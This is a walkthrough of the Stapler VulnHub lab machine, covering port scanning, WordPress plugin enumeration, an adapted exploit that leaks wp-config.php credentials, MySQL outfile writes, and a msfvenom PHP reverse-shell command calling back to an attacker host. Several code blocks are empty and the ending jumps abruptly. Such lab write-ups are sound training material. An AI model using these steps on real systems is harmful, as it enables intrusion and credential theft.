# Stapler
## Intro
This is my walkthrough of the Stapler vulnhub machine.  You can find this machine at [Stapler](https://www.vulnhub.com/entry/stapler-1,150/).  If you want to attempt to hack into this machine without spoilers, don't read the rest of this walkthrough.

## Located machine on network
```
root@sengen-kali:~/vulnhub/stapler# nmap 192.168.56.0/24 -sn

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-28 10:16 PDT

```

## Performed onetwopunch / nmap scans
Using the onetwopunch script which combines unicornscan and nmap I scanned the machine looking for open ports.
```
root@sengen-kali:~/vulnhub/stapler# ~/onetwopunch.sh -t target.txt -p all -n "-A -sV"
```
[\*] TCP ports for nmap to scan: 21,22,53,80,139,666,3306,12380<br />
[\*] UDP ports for nmap to scan: 53,137,45018

Based on our initial scan the following software/versions are revealed<br />
21/tcp    open  ftp         vsftpd 2.0.8 or later<br />
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br />
53/tcp    open  domain      dnsmasq 2.75<br />
80/tcp    open  http        PHP cli server 5.5 or later<br />
139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)<br />
3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1<br />
12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))

## Looking into web ports
Will start by investigating the web ports which appear to be 80 and  12380<br />
<i>Protip: when using curl against the sites you should add the ```--insecure``` or ```-k``` switch so that you get results back even if it doesn't have a valid cert.  If I did not do this I would have seen nothing come back for SSL on 12380</i>

```

## The web site on port 12380 seems to contain something of interest but we'll gobuster them all
```

I noticed .bashrc and .profile files were on port 80 and looked at them with the following commands.  These usually reside at the root of a users home directory so this is odd and may indicated that the port 80 web is actually mounted at an actual home directory (or this is a red herring to throw us off)
```
root@sengen-kali:~/vulnhub/stapler# curl -s -k http://192.168.56.102:80/.bashrc
root@sengen-kali:~/vulnhub/stapler# curl -s -k http://192.168.56.102:80/.profile
```

Nothing of interest was in these files as they looked pretty normal to me.

## SSL on 12380
SSL on 12380 is another story... a lot is going on here.  Need to check robots.txt and /phpmyadmin is always a top target
```
root@sengen-kali:~/vulnhub/stapler# curl -s -k https://192.168.56.102:12380/robots.txt
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```
### Tried default credentials
Attempted several default credentials against https://192.168.56.102:12380/phpmyadmin/index.php but none of them worked

### Looked at https://192.168.56.102:12380/admin112233
When using curl the javascript doesn't run but when navigating to it through the browser it does and states
"This could of been a BeEF-XSS hook ;)" which doesn't look like anything for us to exploit but it could be bade if we were hit with this for real in an actual environment (you would not see the message box of course).

### Looked at https://192.168.56.102:12380/blogblog/
This is a WordPress blog site.  Has a couple posts and the next thing should be running a wpscan against it to see if we can find any vulnerabilities with it.

### Ran WordPress Scan (wpscan)
```

<cut for brevity>
```

A lot of XSS and CSRF vulnerabilites which probably won't apply to us for this type of machine.  The ones that stood out as possibilities are below:<br />
```

```
Some directory listings are said to be available as well so it is always a good idea to check that out especially to find plugins used.

Navigated to https://192.168.56.102:12380/blogblog/wp-content/uploads/ which was an empty directory.  I did a quick check to see if I could "PUT" files there via the following command (PUT is not among the available VERBS):
```
root@sengen-kali:~/vulnhub/stapler# curl -vX OPTIONS https://192.168.56.102:12380/blogblog/wp-content/uploads/ -k
...
< HTTP/1.1 200 OK
< Date: Fri, 28 Jul 2017 12:27:51 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Allow: GET,HEAD,POST,OPTIONS
< Dave: Soemthing doesn't look right here
< Content-Length: 0
< Content-Type: httpd/unix-directory
...
```

## WordPress Plugins
Through traversal I got to the plugins directory at https://192.168.56.102:12380/blogblog/wp-content/plugins/ which listed the following (NOTE: I also ran wpscan with ```--enumerate p``` but it did not show all of these plugins here so if you can get directory browsing you should always double-check what wpscan tells you):
<img src="{{ site.url }}/assets/img/ctf/stapler_1.png"/>

### Some version information extracted from the files in the plugin directories
two-factor = not sure<br />
shortcode-ui = 0.4.0<br />
advanced video = 1.0<br />

### Used searchsploit to check for any known issues and the following came up as the most promising
```
root@sengen-kali:~/vulnhub/stapler# searchsploit advanced video
----------------------------------------------------------------------------------------------- ----------------------------------

                                                                                               | (/usr/share/exploitdb/platforms/)

```
### I downloaded this python file and updated it for my target
Changed:<br />
```url = "http://127.0.0.1/wordpress"```<br />
To<br />
```url = "https://192.168.56.102:12380/blogblog"```

I ran the script and it failed complaining about SSL issues<br />
<i>urllib2.URLError: <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:661)></i><br />

Fine, I can fix this script with some simple python changes to make it not care about that.

### Added the following to the top of the script
```
import ssl 
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
```

### Made the urlopen calls use this new context I created
Changed:<br />
```objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')```
To:<br />
```objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php', context=ctx)```
<br /><br />
Changed:<br />
```objHtml = urllib2.urlopen(url + '/?p=' + str(id))```<br />
To:<br />
```objHtml = urllib2.urlopen(url + '/?p=' + str(id), context=ctx)```

### Ran the exploit again and it successfully created a 260355091.jpeg file in the uploads directory
```
root@sengen-kali:~/vulnhub/stapler# curl -k https://192.168.56.102:12380/blogblog/wp-content/uploads/260355091.jpeg
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');
...
```

### This gave us the credentials needed to log into the phpmyadmin site
<img src="{{ site.url }}/assets/img/ctf/stapler_2.png"/>

Often you can update a page to put a reverse shell in.  I often do this if a template/theme is available.  It is possible that I could download the theme, update it, and then re-upload it to make this work with export/import.<br />

After browing in phpmyadmin for a little bit I realized that 3306 was open publically and it was MySQL.  Maybe, if I'm lucky I can connect remotely and write shellcode through the SQL.

## Connecting to MySQL remotely
<img src="{{ site.url }}/assets/img/ctf/stapler_3.png"/>

We are connected and from experience my first test here is whether or not ```select into outfile``` works.  If it does, then we can drop a shell file into the web directory to gain a shell.

We know the end path is ```/blogblog/wp-content/uploads/``` so we need to figure out where this is relative from. In general, the default locations to try are ```/var/www``` and ```/var/www/html```. In this case, through trial-and-error I found that it was ```/var/www/https```.  The https instead of html for the directory tripped me up for awhile but finally got a good test file to drop into the uploads directory.

<img src="{{ site.url }}/assets/img/ctf/stapler_4.png"/>

Success!

## Creating real PHP shellcode and dropping it onto the server using the same technique
```
root@sengen-kali:~/vulnhub/stapler# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -e php/base64 > shell.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload

php/base64 succeeded with size 1289 (iteration=0)

```

The resulting shellcode needs ```<?php ?>``` added into it turning it into the following
```

Failed... this did not work right.<br />
Looked at the exploit DB article again and it has a comment about "SMEP/SMAP bypass available in descr_v2.c"<br /><br />
Reading more it seems this may not work for me due to it being in a VM as this exploit is against an issue in an Intel CPU that might not be emulated right in VirtualBox... or it just plain won't work in this situation.
